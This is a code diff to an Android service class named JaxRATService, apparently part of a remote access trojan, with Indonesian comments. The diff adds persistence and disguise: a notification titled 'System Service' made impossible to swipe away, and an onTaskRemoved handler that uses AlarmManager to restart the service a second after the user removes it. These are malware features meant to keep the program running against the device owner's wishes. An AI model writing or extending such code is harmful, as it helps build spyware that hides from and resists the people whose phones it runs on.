@@ -1,8 +1,10 @@
 package com.ezax.agent;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
+import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -13,6 +15,7 @@ import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.SystemClock;
 import androidx.core.app.NotificationCompat;
 import org.json.JSONObject;
 import java.io.BufferedReader;
@@ -152,12 +155,27 @@ public class JaxRATService extends Service {
                 .setContentTitle("System Service")
                 .setContentText("Menjalankan layanan sistem...")
                 .setSmallIcon(android.R.drawable.ic_menu_compass)
+                .setOngoing(true) // Bikin notifikasi gak bisa di-swipe
                 .build();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         return START_STICKY; 
+    }
+
+    // --- JURUS BANGKIT KEMBALI KALAU DI-SWIPE ---
+    @Override
+    public void onTaskRemoved(Intent rootIntent) {
+        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
+        restartServiceIntent.setPackage(getPackageName());
+        PendingIntent restartServicePendingIntent = PendingIntent.getService(
+                getApplicationContext(), 1, restartServiceIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
+        AlarmManager alarmService = (AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
+        if (alarmService != null) {
+            alarmService.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 1000, restartServicePendingIntent);
+        }
+        super.onTaskRemoved(rootIntent);
     }
 
     @Override
